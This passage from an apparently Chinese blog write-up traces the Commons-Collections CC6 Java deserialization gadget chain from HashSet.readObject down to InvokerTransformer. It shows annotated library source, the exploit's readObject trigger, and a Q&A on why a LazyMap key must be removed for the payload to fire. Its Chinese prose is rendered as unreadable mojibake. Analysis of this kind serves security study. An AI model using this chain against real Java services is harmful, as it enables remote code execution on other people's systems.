</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ObjectInputStream</span><span class=w> </span><span class=n>objectInputStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ObjectInputStream</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>FileInputStream</span><span class=p>(</span><span class=s>&#34;cc6.out&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>objectInputStream</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h3 id=expæ„é€ åˆ†æ-7>Expæ„é€ åˆ†æ</h3><h4 id=åˆ©ç”¨é“¾å±•ç¤º-5>åˆ©ç”¨é“¾å±•ç¤º</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>HashSet</span><span class=p>.</span><span class=na>readObject</span><span class=p>()</span><span class=o>/</span><span class=n>HashMap</span><span class=p>.</span><span class=na>readObject</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>HashMap</span><span class=p>.</span><span class=na>put</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>HashMap</span><span class=p>.</span><span class=na>hash</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>TiedMapEntry</span><span class=p>.</span><span class=na>hashCode</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>LazyMap</span><span class=p>.</span><span class=na>get</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>ChainedTransformer</span><span class=p>.</span><span class=na>transform</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                        </span><span class=n>InvokerTransformer</span><span class=p>.</span><span class=na>transform</span><span class=p>()</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=hashset>HashSet</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>readObject</span><span class=p>(</span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>ObjectInputStream</span><span class=w> </span><span class=n>s</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>throws</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>io</span><span class=p>.</span><span class=na>IOException</span><span class=p>,</span><span class=w> </span><span class=n>ClassNotFoundException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Read in any hidden serialization magic</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>s</span><span class=p>.</span><span class=na>defaultReadObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Read capacity and verify non-negative.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>capacity</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>s</span><span class=p>.</span><span class=na>readInt</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>capacity</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>InvalidObjectException</span><span class=p>(</span><span class=s>&#34;Illegal capacity: &#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                             </span><span class=n>capacity</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Read load factor and verify positive and non NaN.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>float</span><span class=w> </span><span class=n>loadFactor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>s</span><span class=p>.</span><span class=na>readFloat</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>loadFactor</span><span class=w> </span><span class=o>&lt;=</span><span class=w> </span><span class=n>0</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>Float</span><span class=p>.</span><span class=na>isNaN</span><span class=p>(</span><span class=n>loadFactor</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>InvalidObjectException</span><span class=p>(</span><span class=s>&#34;Illegal load factor: &#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                             </span><span class=n>loadFactor</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Read size and verify non-negative.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>s</span><span class=p>.</span><span class=na>readInt</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>InvalidObjectException</span><span class=p>(</span><span class=s>&#34;Illegal size: &#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                                             </span><span class=n>size</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Set the capacity according to the size and load factor ensuring that</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// the HashMap is at least 25% full but clamping to maximum capacity.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>capacity</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=w> </span><span class=n>Math</span><span class=p>.</span><span class=na>min</span><span class=p>(</span><span class=n>size</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>Math</span><span class=p>.</span><span class=na>min</span><span class=p>(</span><span class=n>1</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=n>loadFactor</span><span class=p>,</span><span class=w> </span><span class=n>4</span><span class=p>.</span><span class=na>0f</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>HashMap</span><span class=p>.</span><span class=na>MAXIMUM_CAPACITY</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Constructing the backing map will lazily create an array when the first element is</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// added, so check it before construction. Call HashMap.tableSizeFor to compute the</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// actual allocation size. Check Map.Entry[].class since it&#39;s the nearest public type to</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// what is actually created.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>SharedSecrets</span><span class=p>.</span><span class=na>getJavaOISAccess</span><span class=p>()</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                     </span><span class=p>.</span><span class=na>checkArray</span><span class=p>(</span><span class=n>s</span><span class=p>,</span><span class=w> </span><span class=n>Map</span><span class=p>.</span><span class=na>Entry</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=n>HashMap</span><span class=p>.</span><span class=na>tableSizeFor</span><span class=p>(</span><span class=n>capacity</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Create backing HashMap</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>map</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(((</span><span class=n>HashSet</span><span class=o>&lt;?&gt;</span><span class=p>)</span><span class=k>this</span><span class=p>)</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>LinkedHashSet</span><span class=w> </span><span class=o>?</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>               </span><span class=k>new</span><span class=w> </span><span class=n>LinkedHashMap</span><span class=o>&lt;</span><span class=n>E</span><span class=p>,</span><span class=n>Object</span><span class=o>&gt;</span><span class=p>(</span><span class=n>capacity</span><span class=p>,</span><span class=w> </span><span class=n>loadFactor</span><span class=p>)</span><span class=w> </span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>               </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=o>&lt;</span><span class=n>E</span><span class=p>,</span><span class=n>Object</span><span class=o>&gt;</span><span class=p>(</span><span class=n>capacity</span><span class=p>,</span><span class=w> </span><span class=n>loadFactor</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// Read in all elements in the proper order.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=o>=</span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>&lt;</span><span class=n>size</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=nd>@SuppressWarnings</span><span class=p>(</span><span class=s>&#34;unchecked&#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>E</span><span class=w> </span><span class=n>e</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>E</span><span class=p>)</span><span class=w> </span><span class=n>s</span><span class=p>.</span><span class=na>readObject</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>map</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>e</span><span class=p>,</span><span class=w> </span><span class=n>PRESENT</span><span class=p>);</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>ç¨‹åºåœ¨ååºåˆ—åŒ–æ—¶ï¼Œåœ¨æ³¨é‡Š1å¤„ï¼Œæ‰§è¡ŒHashMap.put()</p><h4 id=hashmap>HashMap</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>V</span><span class=w> </span><span class=nf>put</span><span class=p>(</span><span class=n>K</span><span class=w> </span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>V</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>putVal</span><span class=p>(</span><span class=n>hash</span><span class=p>(</span><span class=n>key</span><span class=p>),</span><span class=w> </span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>,</span><span class=w> </span><span class=kc>false</span><span class=p>,</span><span class=w> </span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>hash</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>key</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>h</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=n>key</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=n>0</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=p>(</span><span class=n>h</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>key</span><span class=p>.</span><span class=na>hashCode</span><span class=p>())</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=p>(</span><span class=n>h</span><span class=w> </span><span class=o>&gt;&gt;&gt;</span><span class=w> </span><span class=n>16</span><span class=p>);</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>ç¨‹åºåœ¨æ³¨é‡Š1å¤„æ‰§è¡ŒTiedMapEntry.hashCode()</p><h4 id=tiedmapentry-1>TiedMapEntry</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>hashCode</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>getValue</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>getKey</span><span class=p>()</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=n>0</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>getKey</span><span class=p>().</span><span class=na>hashCode</span><span class=p>())</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=n>0</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>value</span><span class=p>.</span><span class=na>hashCode</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>getValue</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>map</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=na>key</span><span class=p>);</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>ç¨‹åºåœ¨æ³¨é‡Š1å¤„è§¦å‘LazyMap.get()ã€‚</p><h4 id=lazymap-1>LazyMap</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>get</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>key</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=kd>super</span><span class=p>.</span><span class=na>map</span><span class=p>.</span><span class=na>containsKey</span><span class=p>(</span><span class=n>key</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>factory</span><span class=p>.</span><span class=na>transform</span><span class=p>(</span><span class=n>key</span><span class=p>);</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kd>super</span><span class=p>.</span><span class=na>map</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>value</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kd>super</span><span class=p>.</span><span class=na>map</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>key</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>ç¨‹åºåœ¨æ³¨é‡Š1å¤„ä¼šæ‰§è¡Œæˆ‘ä»¬æ¶æ„æ„é€ çš„payloadã€‚</p><h3 id=é—®é¢˜è¡¥å……-3>é—®é¢˜è¡¥å……</h3><h4 id=lazymapremovecc6>lazyMap.remove(&ldquo;cc6&rdquo;)</h4><p>Q1ï¼š</p><p>ä¸ºä½•è¦æŠŠcc6åˆ é™¤æ‰</p><p>A1ï¼š</p><p>ä¸»è¦å’ŒLazyMapæœ‰å…³</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>get</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>key</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=kd>super</span><span class=p>.</span><span class=na>map</span><span class=p>.</span><span class=na>containsKey</span><span class=p>(</span><span class=n>key</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=c1>//1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Object</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>factory</span><span class=p>.</span><span class=na>transform</span><span class=p>(</span><span class=n>key</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kd>super</span><span class=p>.</span><span class=na>map</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=n>value</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kd>super</span><span class=p>.</span><span class=na>map</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>key</span><span class=p>);</span><span class=c1>//2</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>å¦‚æœä¸åˆ é™¤åˆ™ä¼šæ‰§è¡Œæ³¨é‡Š2ï¼Œè¿™æ ·å°±è§¦å‘ä¸äº†payloadã€‚</p><p>Q2ï¼š</p><p>cc6è¿™ä¸ªå€¼æ˜¯åœ¨å“ªé‡Œèµ‹å€¼ç»™lazyMapçš„å‘¢ï¼Ÿ</p><p>A2ï¼š</p><p>åœ¨hashSet.add(tiedMapEntry)ï¼Œè¿™ä¸ªè¿‡ç¨‹å’ŒExpåˆ©ç”¨é“¾åŸºæœ¬ä¸€æ ·ã€‚</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=c1>//HashSet</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>add</span><span class=p>(</span><span class=n>E</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>map</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>e</span><span class=p>,</span><span class=w> </span><span class=n>PRESENT</span><span class=p>)</span><span class=o>==</span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=c1>//HashMap</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>V</span><span class=w> </span><span class=nf>put</span><span class=p>(</span><span class=n>K</span><span class=w> </span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>V</span><span class=w> </span><span class=n>value</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>putVal</span><span class=p>(</span><span class=n>hash</span><span class=p>(</span><span class=n>key</span><span class=p>),</span><span class=w> </span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>value</span><span class=p>,</span><span class=w> </span><span class=kc>false</span><span class=p>,</span><span class=w> </span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>hash</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>key</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>int</span><span class=w> </span><span class=n>h</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=n>key</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=n>0</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=p>(</span><span class=n>h</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>key</span><span class=p>.</span><span class=na>hashCode</span><span class=p>())</span><span class=w> </span><span class=o>^</span><span class=w> </span><span class=p>(</span><span class=n>h</span><span class=w> </span><span class=o>&gt;&gt;&gt;</span><span class=w> </span><span class=n>16</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=c1>//.......å’ŒExpåˆ©ç”¨é“¾ç›¸åŒ</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=c1>//ChainedTransformer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>transform</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>object</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>for</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>iTransformers</span><span class=p>.</span><span class=na>length</span><span class=p>;</span><span class=w> </span><span class=o>++</span><span class=n>i</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>object</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>iTransformers</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>.</span><span class=na>transform</span><span class=p>(</span><span class=n>object</span><span class=p>);</span><span class=w>
